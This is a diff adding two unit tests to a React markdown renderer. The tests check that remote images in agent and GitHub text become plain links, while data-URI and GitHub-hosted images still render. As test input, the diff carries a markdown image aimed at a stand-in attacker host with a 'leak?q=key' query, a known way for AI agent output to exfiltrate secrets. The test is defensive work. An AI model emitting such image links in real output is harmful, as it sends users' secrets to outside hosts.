@@ -36,3 +36,22 @@ test("GitHub text renders the HTML GitHub allows, hides comments, and still refu
 	expect(html).not.toContain("onerror");
 	expect(html).not.toContain("<script>");
 });
+
+test("agent text links remote images rather than fetching them, but can show inline data images", () => {
+	const html = renderToStaticMarkup(
+		<MessageMarkdown text={'![secret](https://attacker.example/leak?q=key) ![logo](data:image/png;base64,aGVsbG8=)'} />,
+	);
+	expect(html).not.toContain('<img src="https://attacker.example');
+	expect(html).toContain('<a href="https://attacker.example/leak?q=key"');
+	expect(html).toContain('<img src="data:image/png;base64,aGVsbG8="');
+});
+
+test("GitHub text shows only GitHub-hosted images and links other image URLs", () => {
+	const html = renderToStaticMarkup(
+		<MessageMarkdown github text={'![avatar](https://avatars.githubusercontent.com/u/1?v=4) <img src="https://github.com/user-attachments/assets/123" alt="attachment"> ![other](https://attacker.example/leak)'} />,
+	);
+	expect(html).toContain('<img src="https://avatars.githubusercontent.com/u/1?v=4"');
+	expect(html).toContain('<img src="https://github.com/user-attachments/assets/123"');
+	expect(html).not.toContain('<img src="https://attacker.example');
+	expect(html).toContain('<a href="https://attacker.example/leak"');
+});
